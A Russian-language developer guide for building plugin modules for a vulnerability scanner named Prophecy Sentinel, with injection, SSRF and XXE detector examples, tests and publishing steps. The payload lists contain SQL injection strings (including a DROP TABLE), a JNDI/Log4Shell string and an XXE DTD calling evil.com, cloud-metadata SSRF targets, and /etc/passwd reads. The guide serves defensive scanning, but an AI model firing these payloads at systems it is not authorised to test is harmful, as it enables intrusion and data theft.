# 🔌 Разработка модулей

## 📋 Обзор

Prophecy Sentinel поддерживает плагинную архитектуру, позволяя разработчикам создавать собственные модули для обнаружения специфических уязвимостей и интеграции с внешними системами.

---

## 🏗️ Архитектура модулей

### Базовая структура модуля

```javascript
const BaseModule = require('../core/BaseModule');

class CustomVulnerabilityModule extends BaseModule {
  constructor(config) {
    super(config);
    this.name = 'custom-vulnerability';
    this.version = '1.0.0';
    this.description = 'Custom vulnerability detection module';
  }
  
  async initialize() {
    // Инициализация модуля
    await this.setupDependencies();
    this.log('Module initialized');
  }
  
  async scan(target, context) {
    // Основная логика сканирования
    const vulnerabilities = [];
    
    try {
      const results = await this.detectVulnerabilities(target, context);
      vulnerabilities.push(...results);
    } catch (error) {
      this.error('Scan failed:', error);
    }
    
    return vulnerabilities;
  }
  
  async detectVulnerabilities(target, context) {
    // Кастомная логика обнаружения
    throw new Error('Not implemented');
  }
  
  async cleanup() {
    // Очистка ресурсов
    await this.cleanupResources();
  }
}

module.exports = CustomVulnerabilityModule;
```

---

## 🔧 Создание модуля обнаружения

### Шаг 1: Определение типа уязвимости

```javascript
// src/modules/custom/CustomInjectionModule.js
const BaseModule = require('../../core/BaseModule');

class CustomInjectionModule extends BaseModule {
  constructor(config) {
    super(config);
    this.name = 'custom-injection';
    this.version = '1.0.0';
    this.description = 'Custom injection vulnerability detector';
    
    // Конфигурация по умолчанию
    this.defaultConfig = {
      enabled: true,
      payloads: [
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/a}"
      ],
      detectionPatterns: [
        /SQL syntax.*near/i,
        /ORA-\d{5}/i,
        /Warning.*mysql_/i
      ]
    };
  }
  
  async initialize() {
    await super.initialize();
    this.loadPayloads();
    this.compilePatterns();
  }
  
  loadPayloads() {
    // Загрузка payload'ов из конфигурации
    this.payloads = [
      ...this.defaultConfig.payloads,
      ...(this.config.payloads || [])
    ];
  }
  
  compilePatterns() {
    // Компиляция регулярных выражений
    this.patterns = this.defaultConfig.detectionPatterns.map(pattern => 
      new RegExp(pattern.source, pattern.flags)
    );
  }
}
```

### Шаг 2: Реализация логики обнаружения

```javascript
class CustomInjectionModule extends BaseModule {
  // ... предыдущий код ...
  
  async detectVulnerabilities(target, context) {
    const vulnerabilities = [];
    
    // Получение параметров для тестирования
    const parameters = await this.extractParameters(target, context);
    
    for (const param of parameters) {
      for (const payload of this.payloads) {
        const result = await this.testParameter(target, param, payload, context);
        
        if (result.vulnerable) {
          vulnerabilities.push(this.createVulnerability(result));
        }
      }
    }
    
    return vulnerabilities;
  }
  
  async extractParameters(target, context) {
    // Извлечение параметров из форм, URL, API
    const parameters = [];
    
    // Параметры URL
    const urlParams = this.extractUrlParameters(target.url);
    parameters.push(...urlParams);
    
    // Параметры форм
    if (context.html) {
      const formParams = this.extractFormParameters(context.html);
      parameters.push(...formParams);
    }
    
    // API параметры
    if (context.apiSpec) {
      const apiParams = this.extractApiParameters(context.apiSpec);
      parameters.push(...apiParams);
    }
    
    return parameters;
  }
  
  async testParameter(target, parameter, payload, context) {
    try {
      // Создание вредоносного запроса
      const maliciousUrl = this.buildMaliciousUrl(target.url, parameter, payload);
      
      // Отправка запроса
      const response = await this.sendRequest(maliciousUrl, {
        headers: target.headers,
        timeout: this.config.timeout || 30000
      });
      
      // Анализ ответа
      const isVulnerable = this.analyzeResponse(response);
      
      return {
        vulnerable: isVulnerable,
        url: maliciousUrl,
        parameter: parameter.name,
        payload: payload,
        response: {
          status: response.status,
          headers: response.headers,
          body: response.body
        },
        evidence: this.extractEvidence(response)
      };
      
    } catch (error) {
      this.error(`Error testing parameter ${parameter.name}:`, error);
      return { vulnerable: false, error: error.message };
    }
  }
  
  analyzeResponse(response) {
    const body = response.body || '';
    
    // Проверка на паттерны ошибок
    for (const pattern of this.patterns) {
      if (pattern.test(body)) {
        return true;
      }
    }
    
    // Проверка на временные задержки (time-based)
    if (response.duration > 5000) {
      return true;
    }
    
    // Проверка на различия в ответах
    if (this.detectResponseDifference(response)) {
      return true;
    }
    
    return false;
  }
  
  createVulnerability(result) {
    return {
      id: this.generateId(),
      type: 'Custom Injection',
      severity: this.calculateSeverity(result),
      confidence: this.calculateConfidence(result),
      url: result.url,
      method: 'GET',
      parameter: result.parameter,
      payload: result.payload,
      evidence: result.evidence,
      description: 'Potential custom injection vulnerability detected',
      recommendation: 'Validate and sanitize all user inputs',
      cwe: 'CWE-94',
      cvss: 7.5,
      references: [
        'https://owasp.org/www-project-top-ten/2017/A1_2017-Injection',
        'https://cwe.mitre.org/data/definitions/94.html'
      ]
    };
  }
}
```

---

## 🔗 Интеграция с внешними сервисами

### Модуль интеграции с VirusTotal

```javascript
// src/modules/integrations/VirusTotalModule.js
const BaseModule = require('../../core/BaseModule');
const axios = require('axios');

class VirusTotalModule extends BaseModule {
  constructor(config) {
    super(config);
    this.name = 'virustotal-integration';
    this.version = '1.0.0';
    this.description = 'VirusTotal integration for URL analysis';
    
    this.apiKey = config.apiKey;
    this.baseUrl = 'https://www.virustotal.com/vtapi/v2';
  }
  
  async scan(target, context) {
    const vulnerabilities = [];
    
    // Анализ URL через VirusTotal
    const vtResults = await this.analyzeWithVirusTotal(target.url);
    
    if (vtResults.malicious) {
      vulnerabilities.push({
        id: this.generateId(),
        type: 'Malicious URL',
        severity: 'Critical',
        confidence: 0.95,
        url: target.url,
        evidence: vtResults,
        description: 'URL detected as malicious by VirusTotal',
        recommendation: 'Block access to this URL immediately',
        cwe: 'CWE-88',
        cvss: 9.8
      });
    }
    
    return vulnerabilities;
  }
  
  async analyzeWithVirusTotal(url) {
    try {
      // Проверка URL
      const urlResponse = await axios.get(`${this.baseUrl}/url/report`, {
        params: {
          apikey: this.apiKey,
          resource: url
        }
      });
      
      return {
        scanId: urlResponse.data.scan_id,
        positives: urlResponse.data.positives,
        total: urlResponse.data.total,
        malicious: urlResponse.data.positives > 0,
        permalink: urlResponse.data.permalink,
        scanDate: urlResponse.data.scan_date
      };
      
    } catch (error) {
      if (error.response && error.response.status === 204) {
        // URL еще не сканировался, отправляем на сканирование
        return await this.submitForScanning(url);
      }
      
      throw error;
    }
  }
  
  async submitForScanning(url) {
    const response = await axios.post(`${this.baseUrl}/url/scan`, 
      `apikey=${this.apiKey}&url=${encodeURIComponent(url)}`
    );
    
    // Ожидание результатов сканирования
    await this.waitForScanResults(response.data.scan_id);
    
    return await this.analyzeWithVirusTotal(url);
  }
  
  async waitForScanResults(scanId) {
    const maxAttempts = 30;
    const delay = 10000; // 10 секунд
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const response = await axios.get(`${this.baseUrl}/url/report`, {
          params: {
            apikey: this.apiKey,
            scan_id: scanId
          }
        });
        
        if (response.data.response_code === 1) {
          return response.data;
        }
      } catch (error) {
        // Продолжаем ожидание
      }
      
      await this.sleep(delay);
    }
    
    throw new Error('Scan timeout');
  }
  
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = VirusTotalModule;
```

---

## 🧪 Тестирование модулей

### Unit тесты

```javascript
// tests/modules/CustomInjectionModule.test.js
const CustomInjectionModule = require('../../src/modules/custom/CustomInjectionModule');
const assert = require('assert');

describe('CustomInjectionModule', () => {
  let module;
  
  beforeEach(() => {
    module = new CustomInjectionModule({
      enabled: true,
      timeout: 5000
    });
  });
  
  afterEach(async () => {
    await module.cleanup();
  });
  
  describe('initialization', () => {
    it('should initialize with default config', () => {
      assert.equal(module.name, 'custom-injection');
      assert.equal(module.version, '1.0.0');
      assert.ok(Array.isArray(module.payloads));
    });
    
    it('should load custom payloads', () => {
      const customModule = new CustomInjectionModule({
        payloads: ['custom-payload-1', 'custom-payload-2']
      });
      
      assert.ok(customModule.payloads.includes('custom-payload-1'));
      assert.ok(customModule.payloads.includes('custom-payload-2'));
    });
  });
  
  describe('parameter extraction', () => {
    it('should extract URL parameters correctly', () => {
      const target = {
        url: 'https://example.com/search?q=test&category=web'
      };
      
      const parameters = module.extractUrlParameters(target.url);
      
      assert.equal(parameters.length, 2);
      assert.equal(parameters[0].name, 'q');
      assert.equal(parameters[1].name, 'category');
    });
  });
  
  describe('vulnerability detection', () => {
    it('should detect SQL injection in response', () => {
      const response = {
        body: 'Error: SQL syntax near "OR 1=1"',
        status: 500,
        duration: 1000
      };
      
      const isVulnerable = module.analyzeResponse(response);
      assert.ok(isVulnerable);
    });
    
    it('should detect time-based injection', () => {
      const response = {
        body: 'Success',
        status: 200,
        duration: 6000 // > 5 секунд
      };
      
      const isVulnerable = module.analyzeResponse(response);
      assert.ok(isVulnerable);
    });
  });
});
```

### Интеграционные тесты

```javascript
// tests/integrations/CustomInjectionModule.integration.test.js
const CustomInjectionModule = require('../../src/modules/custom/CustomInjectionModule');
const TestServer = require('../helpers/TestServer');

describe('CustomInjectionModule Integration', () => {
  let module;
  let server;
  
  before(async () => {
    server = new TestServer();
    await server.start(3000);
    
    module = new CustomInjectionModule({
      enabled: true,
      timeout: 5000
    });
    await module.initialize();
  });
  
  after(async () => {
    await module.cleanup();
    await server.stop();
  });
  
  it('should detect SQL injection in test server', async () => {
    const target = {
      url: 'http://localhost:3000/vulnerable-endpoint'
    };
    
    const context = {
      html: '<form><input name="id" type="text"></form>'
    };
    
    const vulnerabilities = await module.scan(target, context);
    
    assert.ok(vulnerabilities.length > 0);
    assert.equal(vulnerabilities[0].type, 'Custom Injection');
    assert.ok(vulnerabilities[0].severity === 'High' || vulnerabilities[0].severity === 'Critical');
  });
});
```

---

## 📦 Публикация модулей

### Структура пакета

```json
// package.json
{
  "name": "@prophecy-sentinel/custom-injection-module",
  "version": "1.0.0",
  "description": "Custom injection vulnerability detection module",
  "main": "index.js",
  "keywords": [
    "security",
    "vulnerability",
    "injection",
    "prophecy-sentinel"
  ],
  "author": "Your Name <your.email@example.com>",
  "license": "MIT",
  "dependencies": {
    "axios": "^0.24.0",
    "cheerio": "^1.0.0-rc.10"
  },
  "peerDependencies": {
    "@prophecy-sentinel/core": "^1.0.0"
  },
  "prophecy-sentinel": {
    "moduleType": "vulnerability-scanner",
    "supportedTargets": ["web", "api"],
    "category": "injection"
  }
}
```

### Регистрация модуля

```javascript
// index.js
const CustomInjectionModule = require('./src/CustomInjectionModule');

module.exports = {
  name: 'custom-injection',
  version: '1.0.0',
  module: CustomInjectionModule,
  config: {
    defaultConfig: require('./config/default.json'),
    schema: require('./config/schema.json')
  }
};
```

### Публикация в npm

```bash
# Установка зависимостей
npm install

# Тестирование
npm test

# Сборка
npm run build

# Публикация
npm publish --access public
```

---

## 🔧 Конфигурация модулей

### Schema валидации

```json
// config/schema.json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "properties": {
    "enabled": {
      "type": "boolean",
      "default": true,
      "description": "Enable/disable the module"
    },
    "timeout": {
      "type": "integer",
      "minimum": 1000,
      "maximum": 300000,
      "default": 30000,
      "description": "Request timeout in milliseconds"
    },
    "payloads": {
      "type": "array",
      "items": {
        "type": "string"
      },
      "default": [],
      "description": "Custom payloads to test"
    },
    "severity": {
      "type": "string",
      "enum": ["Low", "Medium", "High", "Critical"],
      "default": "Medium",
      "description": "Default severity for found vulnerabilities"
    }
  },
  "required": ["enabled"]
}
```

### Валидация конфигурации

```javascript
const Ajv = require('ajv');

class CustomInjectionModule extends BaseModule {
  constructor(config) {
    super(config);
    this.validateConfig(config);
  }
  
  validateConfig(config) {
    const ajv = new Ajv();
    const validate = ajv.compile(require('./config/schema.json'));
    
    if (!validate(config)) {
      const errors = validate.errors.map(err => 
        `${err.instancePath}: ${err.message}`
      );
      throw new Error(`Configuration validation failed: ${errors.join(', ')}`);
    }
    
    this.config = { ...this.defaultConfig, ...config };
  }
}
```

---

## 🔄 Обновление модулей

### Автоматические обновления

```javascript
class CustomInjectionModule extends BaseModule {
  constructor(config) {
    super(config);
    this.updateUrl = 'https://api.example.com/modules/custom-injection/latest';
  }
  
  async checkForUpdates() {
    try {
      const response = await axios.get(this.updateUrl);
      const latestVersion = response.data.version;
      
      if (this.isNewerVersion(latestVersion)) {
        this.log(`Update available: ${latestVersion}`);
        return {
          available: true,
          version: latestVersion,
          downloadUrl: response.data.downloadUrl,
          changelog: response.data.changelog
        };
      }
      
      return { available: false };
    } catch (error) {
      this.error('Update check failed:', error);
      return { available: false, error: error.message };
    }
  }
  
  isNewerVersion(latestVersion) {
    return this.compareVersions(latestVersion, this.version) > 0;
  }
  
  compareVersions(v1, v2) {
    const parts1 = v1.split('.').map(Number);
    const parts2 = v2.split('.').map(Number);
    
    for (let i = 0; i < Math.max(parts1.length, parts2.length); i++) {
      const part1 = parts1[i] || 0;
      const part2 = parts2[i] || 0;
      
      if (part1 > part2) return 1;
      if (part1 < part2) return -1;
    }
    
    return 0;
  }
}
```

---

## 📚 Примеры модулей

### Модуль обнаружения SSRF

```javascript
// src/modules/ssrf/SSRFModule.js
const BaseModule = require('../../core/BaseModule');
const dns = require('dns');
const net = require('net');

class SSRFModule extends BaseModule {
  constructor(config) {
    super(config);
    this.name = 'ssrf-detector';
    this.version = '1.0.0';
    this.description = 'Server-Side Request Forgery detector';
    
    this.payloads = [
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://metadata.google.internal/', // GCP metadata
      'http://127.0.0.1:22/', // Local SSH
      'file:///etc/passwd', // Local file
      'ftp://example.com/test' // FTP protocol
    ];
  }
  
  async detectVulnerabilities(target, context) {
    const vulnerabilities = [];
    
    for (const payload of this.payloads) {
      const result = await this.testSSRF(target, payload);
      
      if (result.vulnerable) {
        vulnerabilities.push(this.createSSRFVulnerability(result));
      }
    }
    
    return vulnerabilities;
  }
  
  async testSSRF(target, payload) {
    try {
      const encodedPayload = encodeURIComponent(payload);
      const testUrl = target.url.replace('VALUE', encodedPayload);
      
      const startTime = Date.now();
      const response = await this.sendRequest(testUrl);
      const endTime = Date.now();
      
      return {
        vulnerable: this.isSSRFResponse(response, endTime - startTime),
        payload: payload,
        response: response,
        timing: endTime - startTime
      };
      
    } catch (error) {
      return { vulnerable: false, error: error.message };
    }
  }
  
  isSSRFResponse(response, timing) {
    // Проверка на внутренние IP адреса в ответе
    const internalIPs = [
      /169\.254\.\d+\.\d+/, // AWS metadata
      /127\.0\.0\.1/, // Localhost
      /192\.168\.\d+\.\d+/, // Private network
      /10\.\d+\.\d+\.\d+/ // Private network
    ];
    
    const body = response.body || '';
    
    for (const pattern of internalIPs) {
      if (pattern.test(body)) {
        return true;
      }
    }
    
    // Проверка на быстрый ответ (внутренняя сеть)
    if (timing < 1000 && response.status === 200) {
      return true;
    }
    
    return false;
  }
}

module.exports = SSRFModule;
```

### Модуль обнаружения XXE

```javascript
// src/modules/xxe/XXEModule.js
const BaseModule = require('../../core/BaseModule');

class XXEModule extends BaseModule {
  constructor(config) {
    super(config);
    this.name = 'xxe-detector';
    this.version = '1.0.0';
    this.description = 'XML External Entity detector';
    
    this.payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><root>&xxe;</root>'
    ];
  }
  
  async detectVulnerabilities(target, context) {
    const vulnerabilities = [];
    
    // Поиск XML endpoints
    const xmlEndpoints = await this.findXMLEndpoints(target, context);
    
    for (const endpoint of xmlEndpoints) {
      for (const payload of this.payloads) {
        const result = await this.testXXE(endpoint, payload);
        
        if (result.vulnerable) {
          vulnerabilities.push(this.createXXEVulnerability(result));
        }
      }
    }
    
    return vulnerabilities;
  }
  
  async findXMLEndpoints(target, context) {
    const endpoints = [];
    
    // Проверка Content-Type: application/xml
    if (context.acceptsXML) {
      endpoints.push({
        url: target.url,
        method: 'POST',
        contentType: 'application/xml'
      });
    }
    
    // Проверка параметров, принимающих XML
    if (context.html) {
      const xmlInputs = this.extractXMLInputs(context.html);
      endpoints.push(...xmlInputs);
    }
    
    return endpoints;
  }
  
  async testXXE(endpoint, payload) {
    try {
      const response = await this.sendRequest(endpoint.url, {
        method: endpoint.method || 'POST',
        headers: {
          'Content-Type': endpoint.contentType || 'application/xml'
        },
        body: payload
      });
      
      return {
        vulnerable: this.isXXEResponse(response),
        payload: payload,
        response: response
      };
      
    } catch (error) {
      return { vulnerable: false, error: error.message };
    }
  }
  
  isXXEResponse(response) {
    const body = response.body || '';
    
    // Проверка на содержимое /etc/passwd
    if (body.includes('root:x:0:0') || body.includes('bin/bash')) {
      return true;
    }
    
    // Проверка на AWS metadata
    if (body.includes('ami-id') || body.includes('instance-id')) {
      return true;
    }
    
    // Проверка на ошибки парсера XML
    if (body.includes('XML parsing error') || body.includes('External entity')) {
      return false; // Ошибка означает защита от XXE
    }
    
    return false;
  }
}

module.exports = XXEModule;
```

---

## 🛠️ Отладка модулей

### Логирование

```javascript
class CustomInjectionModule extends BaseModule {
  constructor(config) {
    super(config);
    this.logger = this.createLogger();
  }
  
  createLogger() {
    return {
      debug: (message, ...args) => {
        if (this.config.debug) {
          console.log(`[${this.name}] DEBUG:`, message, ...args);
        }
      },
      info: (message, ...args) => {
        console.log(`[${this.name}] INFO:`, message, ...args);
      },
      warn: (message, ...args) => {
        console.warn(`[${this.name}] WARN:`, message, ...args);
      },
      error: (message, ...args) => {
        console.error(`[${this.name}] ERROR:`, message, ...args);
      }
    };
  }
  
  async scan(target, context) {
    this.logger.info('Starting scan for target:', target.url);
    
    try {
      const results = await this.detectVulnerabilities(target, context);
      this.logger.info(`Scan completed. Found ${results.length} vulnerabilities`);
      return results;
    } catch (error) {
      this.logger.error('Scan failed:', error);
      throw error;
    }
  }
}
```

### Профилирование

```javascript
class CustomInjectionModule extends BaseModule {
  constructor(config) {
    super(config);
    this.metrics = {
      scans: 0,
      vulnerabilities: 0,
      totalDuration: 0,
      errors: 0
    };
  }
  
  async scan(target, context) {
    const startTime = Date.now();
    this.metrics.scans++;
    
    try {
      const vulnerabilities = await this.detectVulnerabilities(target, context);
      this.metrics.vulnerabilities += vulnerabilities.length;
      
      const duration = Date.now() - startTime;
      this.metrics.totalDuration += duration;
      
      this.logger.debug(`Scan completed in ${duration}ms`);
      
      return vulnerabilities;
    } catch (error) {
      this.metrics.errors++;
      throw error;
    }
  }
  
  getMetrics() {
    return {
      ...this.metrics,
      averageDuration: this.metrics.totalDuration / this.metrics.scans,
      vulnerabilityRate: this.metrics.vulnerabilities / this.metrics.scans
    };
  }
}
```

---

## 📚 Ресурсы для разработчиков

### Документация
- [Prophecy Sentinel Core API](./api-reference.md)
- [Module Development Guidelines](https://docs.prophecy-sentinel.com/modules)
- [Security Best Practices](https://docs.prophecy-sentinel.com/security)

### Инструменты
- [Module Scaffolding Tool](https://github.com/prophecy-sentinel/module-generator)
- [Testing Framework](https://github.com/prophecy-sentinel/test-utils)
- [Validation Schemas](https://github.com/prophecy-sentinel/schemas)

### Сообщество
- [Discord Developer Channel](https://discord.gg/prophecy-sentinel-dev)
- [GitHub Discussions](https://github.com/prophecy-sentinel/discussions)
- [Stack Overflow Tag](https://stackoverflow.com/questions/tagged/prophecy-sentinel)

---

*Последнее обновление: 9 мая 2026*
